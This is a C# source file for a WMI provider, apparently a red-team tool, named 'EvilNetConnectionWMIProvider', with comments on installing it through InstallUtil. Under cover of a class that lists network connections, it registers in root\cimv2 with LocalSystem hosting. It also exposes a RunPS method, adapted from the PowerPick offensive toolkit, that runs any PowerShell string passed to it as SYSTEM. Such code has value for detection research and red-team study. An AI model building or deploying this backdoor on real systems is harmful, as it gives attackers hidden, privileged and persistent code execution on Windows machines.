// http://myitforum.com/cs2/blogs/rzander/archive/2008/08/12/how-to-create-a-wmiprovider-with-c.aspx
// RunPs Method is adapted from @sixdub's PowerPick project https://github.com/Veil-Framework/PowerTools/tree/master/PowerPick

// Instructions
// 1) cd into bin/Debug
// 2) InstallUtil.exe /i EvilNetConnectionWMIProvider.dll

using System;
using System.Text;
using System.Collections;

// Add libraries for Network Connections
using System.Net;
using System.Net.NetworkInformation;

// Add libraries for WMI Provider
using System.Management;
using System.Management.Instrumentation;
using System.Configuration.Install;

// Adding libraries for PowerShell Stuff
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

[assembly: WmiConfiguration(@"root\cimv2", HostingModel = ManagementHostingModel.LocalSystem)]
namespace NetConnectionWMIProvider
{
    [System.ComponentModel.RunInstaller(true)]
    public class MyInstall : DefaultManagementInstaller
    {
        public override void Install(IDictionary stateSaver)
        {
            //This effectively does what gacutil does.
            new System.EnterpriseServices.Internal.Publish().GacInstall("EvilNetConnectionWMIProvider.dll");

            base.Install(stateSaver);
            System.Runtime.InteropServices.RegistrationServices RS = new System.Runtime.InteropServices.RegistrationServices();
        }

        public override void Uninstall(IDictionary savedState)
        {

            try
            {
                new System.EnterpriseServices.Internal.Publish().GacRemove("EvilNetConnectionWMIProvider.dll");

                ManagementClass MC = new ManagementClass(@"root\cimv2:Win32_NetConnection");
                MC.Delete();
            }
            catch { }

            try
            {
                base.Uninstall(savedState);
            }
            catch { }
        }
    }

    [ManagementEntity(Name = "Win32_NetConnection")]
    public class NetConnection
    {
        [ManagementKey]
        public string RemoteAddress { get; set; }
        [ManagementProbe]
        public int RemotePort { get; set; }
        [ManagementProbe]
        public string LocalAddress { get; set; }
        [ManagementProbe]
        public int LocalPort { get; set; }
        [ManagementProbe]
        public string State { get; set; }
        [ManagementProbe]
        public string Protocol { get; set; }


        public NetConnection(TcpConnectionInformation tcp)
        {
            Protocol = "TCP";
            RemoteAddress = tcp.RemoteEndPoint.Address.ToString();
            RemotePort = tcp.RemoteEndPoint.Port;
            LocalAddress = tcp.LocalEndPoint.Address.ToString();
            LocalPort = tcp.LocalEndPoint.Port;
            State = tcp.State.ToString();
        }
        public NetConnection(IPEndPoint ep, string protocol)
        {
            Protocol = protocol;
            LocalAddress = ep.Address.ToString();
            LocalPort = ep.Port;
            State = "LISTENING";
        }


        [ManagementEnumerator]
        static public IEnumerable GetTCPConnections()
        {

            foreach (TcpConnectionInformation tcp in IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections())
            {
                yield return new NetConnection(tcp);
            }
            foreach (IPEndPoint ep in IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpListeners())
            {
                yield return new NetConnection(ep, "TCP");
            }
            foreach (IPEndPoint ep in IPGlobalProperties.GetIPGlobalProperties().GetActiveUdpListeners())
            {
                yield return new NetConnection(ep, "UDP");
            }
        }

        [ManagementTask]
        public static string RunPS(string cmd)
        {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            //Add commands
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
    }
}